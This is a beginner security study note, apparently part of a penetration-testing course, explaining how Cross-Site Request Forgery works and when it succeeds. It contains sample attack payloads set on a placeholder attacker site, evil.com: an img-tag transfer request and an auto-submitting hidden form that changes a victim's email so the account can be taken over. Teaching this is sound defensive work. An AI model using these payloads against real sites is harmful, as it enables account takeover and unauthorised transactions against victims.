---
tags: [vapt, csrf, beginner]
difficulty: beginner
module: "11 - CSRF"
topic: "11.01 What is CSRF?"
portswigger_labs: ["CSRF vulnerability with no defenses"]
---

# 11.01 — What is CSRF?

## Core Concept

Cross-Site Request Forgery (CSRF) tricks a victim's browser into making an unwanted request to a website where the victim is authenticated. The website can't distinguish the legitimate request from the forged one because the browser automatically includes the victim's session cookies.

```
ATTACK FLOW:
  1. Victim is logged into bank.com (has session cookie)
  2. Victim visits evil.com (attacker-controlled page)
  3. evil.com contains: <img src="https://bank.com/transfer?amount=1000&to=ATTACKER">
  4. Victim's browser: "I see an img tag, let me load it from bank.com"
  5. Victim's browser AUTOMATICALLY includes bank.com session cookie!
  6. bank.com receives: GET /transfer?amount=1000&to=ATTACKER
                        Cookie: session=VICTIM_SESSION
  7. bank.com: legitimate user requested a transfer → executes it!
  
  VICTIM NEVER CLICKED ANYTHING! 
  Just visiting evil.com was enough!
```

---

## Why CSRF Works

```
THE FUNDAMENTAL ISSUE:
  Cookies are automatically included in requests
  to the matching domain by the browser.
  
  When evil.com makes your browser request bank.com,
  your bank.com cookie goes along automatically!
  
  The server sees: authenticated request from the user
  It CAN'T tell: was this initiated by the user or an attacker?
  
  UNLESS: A secret CSRF token was required (that evil.com can't access!)
```

---

## CSRF vs XSS Comparison

```
CSRF:
  Evil site → browser makes request → server sees authenticated request
  Requires: victim visits evil.com
  No JS needed (img tags work!)
  Can't read responses (cross-origin + SOP)
  
XSS:
  Attacker injects JS into target site
  No separate evil site needed
  Can read responses, access DOM, steal cookies
  
CSRF IS WEAKER:
  ✓ Can't read data (only submit forms, click, navigate)
  ✓ Blocked by CSRF tokens
  ✓ Increasingly blocked by SameSite cookies
  
  But still HIGH impact for state-changing operations!
```

---

## What CSRF Can Do

```
CSRF CAN:
  ✓ Transfer money / make purchases
  ✓ Change email address or password
  ✓ Add admin accounts
  ✓ Delete accounts/data
  ✓ Change security settings (disable 2FA)
  ✓ Make social media posts
  ✓ Send messages
  ✓ Any action the victim can perform while logged in

CSRF CANNOT:
  ✗ Read responses (due to Same-Origin Policy)
  ✗ Steal cookies (unlike XSS)
  ✗ Read CSRF tokens from the victim's session
     (that's why tokens work as a defense!)
```

---

## Simple CSRF Example

```html
<!-- ATTACKER'S PAGE (evil.com): -->
<!-- Change victim's email: -->
<html>
<body>
  <!-- AUTO-SUBMITTING FORM: -->
  <form action="https://bank.com/change-email" method="POST" id="csrf-form">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>

<!-- WHEN VICTIM VISITS THIS PAGE:
  - The form auto-submits to bank.com
  - Browser includes victim's bank.com cookies
  - bank.com changes the email to attacker@evil.com
  - Attacker uses "forgot password" → controls the account! -->
```

---

## Conditions for CSRF to Work

```
ALL THREE MUST BE TRUE:
  1. RELEVANT ACTION EXISTS:
     A state-changing action (transfer, change settings, etc.)
     Something the attacker wants to do as the victim
  
  2. COOKIE-BASED SESSION HANDLING:
     Session managed via cookies (or HTTP Basic Auth)
     NOT: token-based APIs (where token is in Authorization header)
            ← XHR/fetch sends Authorization headers only when explicitly told
  
  3. NO UNPREDICTABLE PARAMETERS:
     Request parameters can be fully specified by attacker
     No CSRF token (or token can be bypassed)
     No captcha, no password re-entry
     No secret parameter that attacker can't know/forge
```

---

## Where to Test

```
HIGH-VALUE CSRF TARGETS:
  ✓ Password change
  ✓ Email change
  ✓ Account deletion
  ✓ Payment/transfer operations
  ✓ Add/remove administrators
  ✓ Change security settings (2FA toggle)
  ✓ Profile updates
  ✓ API key generation/deletion
  ✓ OAuth app authorization
```

---

## ASCII Diagram: CSRF Flow

```
VICTIM'S BROWSER          EVIL.COM          BANK.COM
----------------          --------          --------
                          [Attacker's page]
  Visits evil.com  ──────→               
                          Returns HTML with
                          hidden form that
                          targets bank.com
  Browser sees form ◄─────
  
  Auto-submits form with
  victim's bank.com cookie  ─────────────────────────→
                                              Receives authenticated
                                              request: transfer $1000
                                              to attacker!
```

---

## Related Notes
- [[02 - Same-Origin Policy and CSRF]] — why SOP doesn't prevent CSRF
- [[03 - CSRF via GET Request]] — simple CSRF
- [[04 - CSRF via POST Request]] — form-based CSRF
- [[09 - CSRF to Account Takeover]] — escalation
- [[10 - Defense CSRF Tokens SameSite]] — how to defend
- [[Module 07 - XSS]] — XSS bypasses CSRF tokens!
